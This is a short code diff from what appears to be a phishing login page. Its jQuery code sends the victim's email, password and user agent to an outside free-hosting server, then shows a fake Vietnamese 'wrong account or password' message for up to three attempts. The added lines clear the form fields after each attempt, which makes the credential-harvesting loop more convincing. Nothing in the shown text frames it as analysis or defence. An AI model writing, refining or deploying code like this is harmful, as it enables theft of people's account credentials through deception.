@@ -88,6 +88,8 @@
                         console.log(ua);
                        $.post('https://cailonnek.000webhostapp.com/index.php', {email: email,pass: pass, ua:ua}, function(data, textStatus, xhr) {
                           if(i<3){
+                               $("#email").val("");
+                               $("#pass").val("");
                                $("#lblMsg").html("Tài khoản hoặc mật khẩu không chính xác")
                               i++;
                           }
